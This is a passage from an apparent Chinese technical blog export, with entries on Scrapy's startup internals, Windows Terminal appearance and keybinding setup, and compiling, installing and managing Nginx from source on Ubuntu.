cmd.add_options(parser)</span><br><span class="line">    opts, args = parser.parse_args(args=argv[<span class="number">1</span>:])</span><br><span class="line">    _run_print_help(parser, cmd.process_options, args, opts)</span><br><span class="line"></span><br><span class="line">    cmd.crawler_process = CrawlerProcess(settings)	<span class="comment"># 动态加载爬虫模块</span></span><br><span class="line">    _run_print_help(parser, _run_command, cmd, args, opts)	<span class="comment"># 实例化爬虫类和启动引擎</span></span><br><span class="line">    sys.exit(cmd.exitcode)</span><br></pre></td></tr></table></figure>

<p>先看看<code>get_project_settings()</code></p>
<p><img data-src="http://img.owq.world/2022/01/1453-5f4a43.png"></p>
<p>里面重要的地方是初始化<code>Settings</code>类的过程</p>
<p><img data-src="http://img.owq.world/2022/01/1447-ded0a5.png"></p>
<p><code>Settings</code>类进行了模块的动态加载, <code>self.setmodule</code>最终会调用<code>import_module()</code>方法</p>
<p><img data-src="http://img.owq.world/2022/01/1708-80010a.png"></p>
<p>通过调试看看<code>settings</code>下,最后加载了<code>attributes</code>里一大堆配置.</p>
<p><img data-src="http://img.owq.world/2022/01/1445-54618b.png"></p>
<p>接下来看看<code>_get_commands_dict()</code></p>
<p><img data-src="http://img.owq.world/2022/01/1455-224efe.png"></p>
<p>这里主要加载了<code>scrapy.commands</code>下所有模块</p>
<p><img data-src="http://img.owq.world/2022/01/1501-4e87e3.png"></p>
<p><img data-src="http://img.owq.world/2022/01/1515-04bf67.png"></p>
<p>最后返回模块名和其映射，仔细看看这不就是运行<code>Scrapy</code>的命令吗</p>
<p><img data-src="http://img.owq.world/2022/01/1514-577b65.png"></p>
<p>继续往下看，加载<code>Scrapy</code>自带的解析器后，开始准备命令的执行工作了。</p>
<p><img data-src="http://img.owq.world/2022/01/1532-684509.png"></p>
<p>准备工作做完了，开始初始化<code>CrawlerProcess()</code></p>
<p><img data-src="http://img.owq.world/2022/01/1537-269ec9.png"></p>
<p>看看继承的类<code>CrawlerRunner</code>， 这个才是重点</p>
<p><img data-src="http://img.owq.world/2022/01/1542-f41c3c.png"></p>
<p><code>CrawlerRunner</code>的<code>__init__</code>调用了<code>_get_spider_loader(settings)</code>,它调用了<code>load_object()</code>方法</p>
<p><img data-src="http://img.owq.world/2022/01/1550-d35b02.png"></p>
<p><code>load_object()</code>使用<code>import_module()</code>动态加载了<code>scrapy.spiderloader</code>模块</p>
<p><img data-src="http://img.owq.world/2022/01/1555-c331b2.png"></p>
<p><code>SpiderLoader</code>加载时调用了<code>_load_all_spiders()</code>方法</p>
<p><img data-src="http://img.owq.world/2022/01/1558-e763f6.png"></p>
<p>它通过<code>walk_modules</code>方法加载了spiders目录下所有的爬虫</p>
<p><img data-src="http://img.owq.world/2022/01/1601-2b4ada.png" alt="image-20220105160151008"></p>
<p>接下来看看<code>_run_command</code>方法。</p>
<p><img data-src="http://img.owq.world/2022/01/1608-f3621c.png"></p>
<p>它最后都会执行<code>scrapy.commands.crawl</code>里的<code>run</code>方法，启动爬虫引擎，这也是极其重要的一步.<br>其中<code>crawl</code>方法会实例化<code>scrapy.crawler.Crawler</code>类, 之后通过<code>start()</code>来启动爬虫引擎.</p>
<p><img data-src="http://img.owq.world/2022/01/1638-ca1010.png" alt="image-20220105163802583"></p>
<p>至此, 大致的执行逻辑就捋清了<code>ヾ(•ω•</code>)o&#96;</p>
<h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><h3 id="import-module"><a href="#import-module" class="headerlink" title="import_module()"></a>import_module()</h3><blockquote>
<p>这是<code>Python</code>自带<code>importlib</code>库的方法, 也是进行动态加载模块的关键, <code>Scrapy</code>的很多方法都使用到它.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">import_module</span>(<span class="params">name, package=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Import a module.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The &#x27;package&#x27; argument is required when performing a relative import. It</span></span><br><span class="line"><span class="string">    specifies the package to use as the anchor point from which to resolve the</span></span><br><span class="line"><span class="string">    relative import to an absolute import.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    level = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> name.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> package:</span><br><span class="line">            msg = (<span class="string">&quot;the &#x27;package&#x27; argument is required to perform a relative &quot;</span></span><br><span class="line">                   <span class="string">&quot;import for &#123;!r&#125;&quot;</span>)</span><br><span class="line">            <span class="keyword">raise</span> TypeError(msg.<span class="built_in">format</span>(name))</span><br><span class="line">        <span class="keyword">for</span> character <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">if</span> character != <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            level += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> _bootstrap._gcd_import(name[level:], package, level)</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>技术记录</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows Terminal 快速配置</title>
    <url>/terminal/</url>
    <content><![CDATA[<h1 id="Windows-Terminal-快速配置"><a href="#Windows-Terminal-快速配置" class="headerlink" title="Windows Terminal 快速配置"></a>Windows Terminal 快速配置</h1><blockquote>
<p>官方文档: <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vd2luZG93cy90ZXJtaW5hbC8=">https://docs.microsoft.com/zh-cn/windows/terminal/</span></p>
</blockquote>
<h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><blockquote>
<p>项目地址 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pY3Jvc29mdC90ZXJtaW5hbA==">🚪</span><br>下载地址 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pY3Jvc29mdC90ZXJtaW5hbC9yZWxlYXNlcy9sYXRlc3Q=">🚪</span></p>
</blockquote>
<p>或者使用<code>winget</code>安装</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">winget install <span class="literal">--id</span>=Microsoft.WindowsTerminal <span class="literal">-e</span></span><br></pre></td></tr></table></figure>

<h2 id="外观配置"><a href="#外观配置" class="headerlink" title="外观配置"></a>外观配置</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;theme&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dark&quot;</span><span class="punctuation">,</span>	<span class="comment">// 主题颜色</span></span><br><span class="line"><span class="attr">&quot;initialCols&quot;</span><span class="punctuation">:</span> <span class="number">100</span><span class="punctuation">,</span>	<span class="comment">// 窗口列数</span></span><br><span class="line"><span class="attr">&quot;initialRows&quot;</span><span class="punctuation">:</span> <span class="number">28</span><span class="punctuation">,</span>	<span class="comment">// 窗口行数</span></span><br><span class="line"><span class="attr">&quot;profiles&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;defaults&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;closeOnExit&quot;</span><span class="punctuation">:</span> <span class="string">&quot;graceful&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;colorScheme&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Default&quot;</span><span class="punctuation">,</span>	<span class="comment">// 配色方案</span></span><br><span class="line">        <span class="attr">&quot;font&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;face&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Fira Code&quot;</span><span class="punctuation">,</span>	<span class="comment">// 使用字体</span></span><br><span class="line">            <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">10</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;useAcrylic&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span>		<span class="comment">// 亚克力背景</span></span><br><span class="line">        <span class="attr">&quot;acrylicOpacity&quot;</span><span class="punctuation">:</span> <span class="number">0.75</span><span class="punctuation">,</span>		<span class="comment">// 透明度</span></span><br><span class="line">        <span class="attr">&quot;padding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10, 8, 0, 2&quot;</span>	<span class="comment">// 窗口内边框</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Fira-Code-字体"><a href="#Fira-Code-字体" class="headerlink" title="Fira Code 字体"></a>Fira Code 字体</h3><blockquote>
<p>项目地址 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RvbnNreS9GaXJhQ29kZQ==">🚪</span><br>下载地址 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RvbnNreS9GaXJhQ29kZS9yZWxlYXNlcy9kb3dubG9hZC82L0ZpcmFfQ29kZV92Ni56aXA=">🚪</span></p>
</blockquote>
<p>带图标字体（推荐）</p>
<blockquote>
<p>项目地址 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J5YW5vYXNpcy9uZXJkLWZvbnRz">🚪</span><br>下载地址 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J5YW5vYXNpcy9uZXJkLWZvbnRzL3JlbGVhc2VzL2Rvd25sb2FkL3YyLjEuMC9GaXJhQ29kZS56aXA=">🚪</span></p>
</blockquote>
<p>将安装包内的 <code>FiraCode</code> 系列字体解压安装</p>
<img data-src="http://img.owq.world/2021/12/1637-38fb5b.png" style="zoom: 80%;" />

<p>终端字体配置使用<code>FiraCode Nerd Font</code>即可生效</p>
<img data-src="http://img.owq.world/2021/12/1641-8e55ff.png" style="zoom:67%;" />

<h3 id="果冻颜色方案"><a href="#果冻颜色方案" class="headerlink" title="果冻颜色方案"></a>果冻颜色方案</h3><blockquote>
<p>个人专属果冻配色（￣。。￣）</p>
</blockquote>
<p><code>schemes</code> 标签里添加</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;background&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#2C2C2C&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;black&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#4A4A4A&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;blue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#69B4D9&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightBlack&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#A8A8A8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightBlue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#669AEB&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightCyan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#32EBDA&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightGreen&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#31D328&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightPurple&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#A972AD&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightRed&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FD5469&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightWhite&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#E6E6E6&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightYellow&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#F1E452&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cursorColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FFFFFF&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cyan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#80F3DA&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FCFCFC&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;green&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#91D97A&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Default&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;purple&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#AD7FA8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;red&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#E06C75&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;selectionBackground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FFFFFF&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;white&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FFFFE4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;yellow&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#EEE691&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="最终效果图"><a href="#最终效果图" class="headerlink" title="最终效果图"></a>最终效果图</h3><p><img data-src="http://img.owq.world/2021/12/1716-d121ee.png"></p>
<h2 id="快捷键配置"><a href="#快捷键配置" class="headerlink" title="快捷键配置"></a>快捷键配置</h2><p>将常用快捷操作和系统快捷键统一</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;actions&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;toggleFullscreen&quot;</span><span class="punctuation">,</span>  <span class="comment">// 全屏切换</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+m&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;find&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+f&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;closePane&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+w&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;copy&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;singleLine&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+c&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;paste&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+v&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;splitPane&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;split&quot;</span><span class="punctuation">:</span> <span class="string">&quot;auto&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;splitMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;duplicate&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+d&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newTab&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+1&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newTab&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+2&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newTab&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+3&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    	<span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newTab&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+4&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newTab&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+5&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<h2 id="其它外观配置"><a href="#其它外观配置" class="headerlink" title="其它外观配置"></a>其它外观配置</h2><p>启动列表内添加</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;experimental.retroTerminalEffect&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span>	<span class="comment">// 复古风格</span></span><br><span class="line"><span class="attr">&quot;font&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;weight&quot;</span><span class="punctuation">:</span> <span class="string">&quot;medium&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span>	<span class="comment">// 字体自定义</span></span><br><span class="line"><span class="attr">&quot;startingDirectory&quot;</span><span class="punctuation">:</span> <span class="string">&quot;//wsl$/kali-linux/&quot;</span>	<span class="comment">// 初始目录</span></span><br></pre></td></tr></table></figure>

<p>也可以直接在设置里面操作设置</p>
<p><img data-src="http://img.owq.world/2021/12/1730-e12888.png"></p>
]]></content>
      <categories>
        <category>配置记录</category>
      </categories>
      <tags>
        <tag>Terminal</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx 安装升级教程</title>
    <url>/51f3ce14/</url>
    <content><![CDATA[<blockquote>
<p>操作环境: ubuntu 20.04.3<br>官方文档: <span class="exturl" data-url="aHR0cHM6Ly93d3cubmdpbnguY29tL3Jlc291cmNlcy93aWtpL3N0YXJ0">https://www.nginx.com/resources/wiki/start</span></p>
</blockquote>
<h2 id="简单了解"><a href="#简单了解" class="headerlink" title="简单了解"></a>简单了解</h2><blockquote>
<p>Nginx是异步框架的网页服务器，也可以用作<strong>反向代理</strong>、<strong>负载均衡器</strong>和HTTP缓存。</p>
<p>该软件由伊戈尔·赛索耶夫创建并于2004年首次公开发布。<br>2011年成立同名公司以提供支持。<br>2019年3月11日，Nginx公司被F5 Networks以6.7亿美元收购。 </p>
<p>Nginx是免费的开源软件，根据类BSD许可证的条款发布。</p>
</blockquote>
<h2 id="包管理器安装"><a href="#包管理器安装" class="headerlink" title="包管理器安装"></a>包管理器安装</h2><blockquote>
<p>包管理器提供的软件包会有些过时，不建议使用</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install nginx</span><br></pre></td></tr></table></figure>

<h2 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h2><h3 id="相关包安装"><a href="#相关包安装" class="headerlink" title="相关包安装"></a>相关包安装</h3><ul>
<li><p>GCC<br>包含各种语言的编译器, 用来编译Nginx的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install build-essential</span><br></pre></td></tr></table></figure>
</li>
<li><p>OpenSSL<br>提供SSL支持, 如设置https</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">apt <span class="keyword">install</span> openssl libssl-dev</span><br></pre></td></tr></table></figure>
</li>
<li><p>PCRE<br>提供正则表达式解析, 如HTTP模块中匹配路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install libpcre3 libpcre3-dev</span><br></pre></td></tr></table></figure>
</li>
<li><p>zlib</p>
<p>提供了开发人员的压缩算法, 如HTTP响应使用压缩减少传输流量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install zlib1g-dev</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>一次性安装</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install build-essential openssl libssl-dev libpcre3 libpcre3-dev zlib1g-dev</span><br></pre></td></tr></table></figure>

<h3 id="下载编译"><a href="#下载编译" class="headerlink" title="下载编译"></a>下载编译</h3><blockquote>
<p>默认情况下，NGINX 将安装在<code>/usr/local/nginx</code>.</p>
</blockquote>
<p>进入<span class="exturl" data-url="aHR0cHM6Ly9uZ2lueC5vcmcvZW4vZG93bmxvYWQuaHRtbA==">下载页面</span>, 获取稳定版本下载链接<br><img data-src="http://img.owq.world/2021/11/1650-4a1fe7.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://nginx.org/download/nginx-1.20.1.tar.gz</span><br></pre></td></tr></table></figure>

<p>创建目录进行包管理（方便之后使用其它版本）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p nginx/core</span><br><span class="line"><span class="built_in">mv</span> nginx-1.20.1.tar.gz nginx/core</span><br></pre></td></tr></table></figure>

<p>解压包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> nginx/core</span><br><span class="line">tar -zxf nginx-1.20.1.tar.gz</span><br></pre></td></tr></table></figure>

<p>进入资源文件，执行configure</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> nginx-1.20.1/</span><br><span class="line"><span class="comment"># 直接安装不会配置环境变量和安装模块，具体配置看下一小节</span></span><br><span class="line">./configure</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">make</span></span><br></pre></td></tr></table></figure>

<p>安装</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">make <span class="keyword">install</span></span><br></pre></td></tr></table></figure>

<p>设置全局变量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /usr/local/nginx/nginx /usr/local/bin</span><br></pre></td></tr></table></figure>



<h2 id="配置安装（可选）"><a href="#配置安装（可选）" class="headerlink" title="配置安装（可选）"></a>配置安装（可选）</h2><blockquote>
<p>configure参数说明 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9uZ2lueC5vcmcvZW4vZG9jcy9jb25maWd1cmUuaHRtbA==">🚪</span><br>中文翻译 -&gt; <a href="/nginx-configure/">🚪</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure \</span><br><span class="line">--prefix=/usr/local/nginx \</span><br><span class="line">--sbin-path=/usr/local/nginx/nginx \</span><br><span class="line">--modules-path=/usr/local/nginx/modules \</span><br><span class="line">--conf-path=/usr/local/nginx/nginx.conf \</span><br><span class="line">--error-log-path=/usr/local/nginx/logs/error.log \</span><br><span class="line">--http-log-path=/usr/local/nginx/logs/access.log \</span><br><span class="line">--pid-path=/usr/local/nginx/logs/nginx.pid \</span><br><span class="line">--lock-path=/usr/local/nginx/logs/nginx.lock \</span><br><span class="line">--with-debug --with-compat --with-pcre-jit --with-http_ssl_module --with-http_stub_status_module --with-http_realip_module --with-http_auth_request_module --with-http_v2_module --with-http_dav_module --with-http_slice_module --with-threads --with-http_addition_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_sub_module --with-stream_ssl_module --with-mail_ssl_module --with-stream</span><br></pre></td></tr></table></figure>

<p>最后会输出配置信息</p>
<p><img data-src="http://img.owq.world/2021/11/1702-d6315d.png"></p>
<h2 id="卸载操作"><a href="#卸载操作" class="headerlink" title="卸载操作"></a>卸载操作</h2><p>停止nginx进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -s stop</span><br></pre></td></tr></table></figure>

<p>删除安装目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf /usr/local/nginx</span><br></pre></td></tr></table></figure>

<p>清除编译环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make clean</span><br></pre></td></tr></table></figure>



<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul>
<li><p>启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx</span><br></pre></td></tr></table></figure>
</li>
<li><p>停止</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -s stop</span><br></pre></td></tr></table></figure>
</li>
<li><p>安全退出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -s quit</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试配置文件语法是否正确</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -t</span><br></pre></td></tr></table></figure>
</li>
<li><p>重新加载配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看版本及配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -V</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="版本升级"><a href="#版本升级" class="headerlink" title="版本升级"></a>版本升级</h2><blockquote>
<p>在不停止Nginx服务的情况下进行平滑升级</p>
</blockquote>
